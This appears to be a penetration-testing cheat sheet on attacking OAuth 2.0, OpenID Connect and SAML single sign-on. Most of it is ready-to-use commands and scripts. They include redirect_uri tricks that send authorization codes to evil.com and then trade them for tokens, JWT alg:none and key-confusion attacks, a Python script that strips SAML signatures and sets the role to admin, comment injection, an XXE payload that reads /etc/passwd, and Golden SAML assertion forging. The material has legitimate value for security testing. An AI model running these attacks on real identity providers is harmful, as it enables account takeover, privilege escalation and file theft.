# OAuth / OIDC / SAML Attacks

Three auth delegation frameworks — each with distinct attack surfaces.

---

## OAuth 2.0

### Flow Overview

```
Resource Owner (user) → Authorization Server → Access Token → Resource Server
```

Key grant types:
- **Authorization Code** — server-side apps (most common, most secure)
- **Implicit** — deprecated, token in URL fragment
- **Client Credentials** — machine-to-machine
- **Device Code** — TV/CLI devices

### Recon

```bash
# Discovery endpoints
curl -s "https://<target>/.well-known/oauth-authorization-server" | python3 -m json.tool
curl -s "https://<target>/.well-known/openid-configuration" | python3 -m json.tool
# Returns: authorization_endpoint, token_endpoint, jwks_uri, scopes_supported

# Identify OAuth in traffic
# Look for: ?code=, ?state=, ?access_token=, ?token_type=Bearer
# Authorization header: Bearer <token>
# Redirect parameters: redirect_uri=, callback=, return_url=
```

### `redirect_uri` Manipulation

```bash
# If redirect_uri not strictly validated — steal auth code
# Legit flow: redirect_uri=https://app.com/callback
# Attack: point to attacker-controlled URL

# 1. Open redirect on target domain → use as redirect_uri
# https://<authserver>/authorize?client_id=<id>&redirect_uri=https://target.com/redirect?url=https://evil.com&response_type=code&scope=openid

# 2. Append path/fragment tricks
https://<authserver>/authorize?client_id=<id>&redirect_uri=https://app.com.evil.com/callback
https://<authserver>/authorize?client_id=<id>&redirect_uri=https://app.com@evil.com/callback
https://<authserver>/authorize?client_id=<id>&redirect_uri=https://app.com/callback/../../../evil

# 3. Path traversal variants
https://<authserver>/authorize?client_id=<id>&redirect_uri=https://app.com/callback/../../../../evil

# Craft malicious link for victim — victim clicks, code sent to attacker
# Attacker exchanges code for token at token endpoint
curl -s -X POST "https://<authserver>/token" \
  -d "grant_type=authorization_code&code=<stolen_code>&redirect_uri=https://evil.com&client_id=<id>&client_secret=<secret>"
```

### `state` CSRF

```bash
# state parameter should be random and verified
# If missing or predictable → CSRF on OAuth callback

# Craft OAuth URL with no state or fixed state
# Victim visits: https://<authserver>/authorize?client_id=<id>&redirect_uri=<url>&response_type=code&scope=openid&state=FIXED
# After victim auth, attacker navigates to callback with attacker's code:
# https://app.com/callback?code=<attacker_code>&state=FIXED
# → App associates attacker's account with victim's session
```

### Token Leakage

```bash
# Implicit flow — access_token in URL fragment
# https://app.com/callback#access_token=<token>&token_type=Bearer
# Fragment logged in browser history, referrer headers, proxy logs

# Check if token is in URL params (query string)
curl -v "https://<target>/callback?access_token=<token>" 2>&1 | grep -i referer

# Check for token in server logs via SSRF
# Send referrer with OAuth token to attacker-controlled URL
```

### Scope Escalation

```bash
# Request more scopes than granted
curl -s "https://<authserver>/authorize?client_id=<id>&scope=openid+profile+email+admin&response_type=code&redirect_uri=<url>&state=xyz"

# Try undocumented scopes
for scope in admin superuser read:all write:all offline_access; do
  echo -n "$scope: "
  code=$(curl -so /dev/null -w "%{http_code}" \
    "https://<authserver>/authorize?client_id=<id>&scope=$scope&response_type=code&redirect_uri=<url>")
  echo "$code"
done

# Token exchange — if token has scope, can it be upgraded?
curl -s -X POST "https://<authserver>/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=<token>&requested_token_type=urn:ietf:params:oauth:token-type:access_token&scope=admin"
```

### Client Credentials Abuse

```bash
# Leaked client_id/client_secret → get token directly
curl -s -X POST "https://<authserver>/token" \
  -d "grant_type=client_credentials&client_id=<id>&client_secret=<secret>&scope=openid profile"

# Find secrets in:
# - JavaScript source: client_secret, client_id
# - Android APK decompile: strings.xml, retrofit interfaces
# - iOS app binary: strings binary
# - GitHub/public repos

# Search JS for OAuth secrets
curl -s "https://<target>/app.js" | grep -oP "client_?id['\": ]+['\"]?\K[A-Za-z0-9_-]+"
curl -s "https://<target>/app.js" | grep -oP "client_?secret['\": ]+['\"]?\K[A-Za-z0-9_-]+"
```

---

## OIDC (OpenID Connect)

OIDC adds identity layer on top of OAuth — introduces ID tokens (JWTs).

```bash
# ID token is a JWT — apply all JWT attacks
# Decode and check claims
echo "<id_token>" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Key claims to tamper:
# sub: user identifier
# email: email address
# email_verified: true/false → set to true
# roles / groups
# iss: issuer — if not strictly validated, spoof with your own IdP

# OIDC token substitution — use ID token from one app in another
# If two apps trust same IdP but don't validate audience (aud claim)
# Token from app A → replay against app B

# alg:none attack on ID token (same as JWT attacks)
python3 jwt_tool.py <id_token> -X a

# Key confusion RS256 → HS256 (same as JWT)
python3 jwt_tool.py <id_token> -X k -pk pubkey.pem

# JWKS endpoint spoofing via jku header
python3 jwt_tool.py <id_token> -X s -ju "http://<attacker>/jwks.json"
```

---

## SAML

XML-based SSO protocol. IdP signs assertion, SP verifies. Attacks target signature validation.

### Identify

```bash
# SAMLRequest / SAMLResponse in POST body or GET (URL-encoded, base64, then deflated/gzipped)
# Common paths:
curl -s -I "https://<target>/sso/saml" 
curl -s -I "https://<target>/auth/saml"
curl -s -I "https://<target>/saml/acs"   # assertion consumer service

# Intercept login redirect — look for SAMLRequest parameter
# Decode SAMLRequest:
echo "<samlrequest_value>" | base64 -d | python3 -c "import sys,zlib; print(zlib.decompress(sys.stdin.buffer.read(), -15).decode())"
```

### Decode / Encode SAML

```bash
# Decode SAMLResponse (base64 → XML)
echo "<saml_response>" | base64 -d > response.xml
cat response.xml | python3 -m xml.dom.minidom /dev/stdin | less

# Or with xmllint
echo "<saml_response>" | base64 -d | xmllint --format -

# Re-encode after modification:
cat modified.xml | base64 -w 0
```

### Signature Bypass Techniques

```bash
# 1. Remove signature entirely
# If SP doesn't require signature:
python3 << 'EOF'
import base64
from lxml import etree

xml = base64.b64decode("<saml_response>")
root = etree.fromstring(xml)

# Remove Signature element
ns = {"ds": "http://www.w3.org/2000/09/xmldsig#"}
for sig in root.findall(".//ds:Signature", ns):
    sig.getparent().remove(sig)

# Modify claims
ns2 = {"saml": "urn:oasis:names:tc:SAML:2.0:assertion"}
for attr in root.findall(".//saml:Attribute[@Name='role']//saml:AttributeValue", ns2):
    attr.text = "admin"
for nameid in root.findall(".//saml:NameID", ns2):
    nameid.text = "admin@target.com"

modified = base64.b64encode(etree.tostring(root)).decode()
print(modified)
EOF

# 2. XML Signature Wrapping (XSW)
# Move signed element — SP validates original, uses unsigned modified copy
# 8 known XSW variants (XSW1-8)
# Use SAMLRaider (Burp extension) for automated XSW testing

# 3. Comment injection
# <!-- admin --><NameID>user@target.com</NameID>
# Some parsers see "admin" as the NameID value, others ignore comments
# Inject: admin<!--
python3 << 'EOF'
import base64
xml = base64.b64decode("<saml_response>").decode()
# Replace NameID value:
xml = xml.replace(">user@target.com<", ">admin<!--@target.com<")
# → NameID = "admin<!-- @target.com" (truncated at comment)
print(base64.b64encode(xml.encode()).decode())
EOF
```

### XXE via SAML

```bash
# SAML XML is parsed by SP — inject XXE in SAMLResponse
python3 << 'EOF'
import base64

xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>"""

print(base64.b64encode(xxe_payload.encode()).decode())
EOF
```

### Golden SAML (Post-Compromise)

```bash
# Requires: ADFS token signing certificate + private key
# Allows forging SAML assertions for any user including Global Admin

# Extract ADFS token signing cert (requires ADFS server access or DA)
# PowerShell on ADFS server:
# Get-AdfsProperties | Select -ExpandProperty SigningCertificate

# ADFSDump (requires ADFS service account or DA)
# https://github.com/mandiant/ADFSDump
python3 ADFSDump.py -p <adfs-password>

# SharpDump ADFS cert from DKM (Distributed Key Manager) in AD
# Requires DA or ADFS server access

# Forge assertion with stolen cert:
# https://github.com/secureworks/whiskeysamlandfriends
python3 GoldenSAML.py \
  --cert adfs-signing.pfx --certpass <pass> \
  --target "https://<sp>/saml/acs" \
  --nameid "admin@target.com" \
  --role "Admin"
```

---

## Tools

```bash
# jwt_tool — JWT attacks (OAuth tokens, OIDC ID tokens)
python3 jwt_tool.py <token> -X -v

# SAMLRaider (Burp extension) — SAML manipulation, XSW attacks
# BApp Store → SAML Raider

# SAML-tracer (Firefox extension) — inspect SAML flows

# oauth2-proxy / Fiddler — intercept OAuth flows

# TokenSpy — hunt for OAuth tokens in JS
# git clone https://github.com/dub-flow/tokenspy

# postman-to-graphql — if GraphQL OAuth flow

# Burp → match & replace rules to tamper OAuth params on the fly
```

---

## Quick Reference

```bash
# OAuth recon
curl -s "https://<target>/.well-known/openid-configuration" | python3 -m json.tool

# Steal auth code via redirect_uri manipulation
# https://<authserver>/authorize?client_id=X&redirect_uri=https://evil.com&response_type=code&scope=openid

# Exchange stolen code
curl -s -X POST "https://<authserver>/token" \
  -d "grant_type=authorization_code&code=<stolen>&redirect_uri=https://evil.com&client_id=X&client_secret=Y"

# Decode SAML response
echo "<saml>" | base64 -d | xmllint --format -

# Decode OIDC/OAuth JWT token
echo "<token>" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# alg:none on OIDC token
python3 jwt_tool.py <token> -X a

# SAML comment injection for NameID
# admin<!--@target.com (parsed as "admin" by some libraries)
```
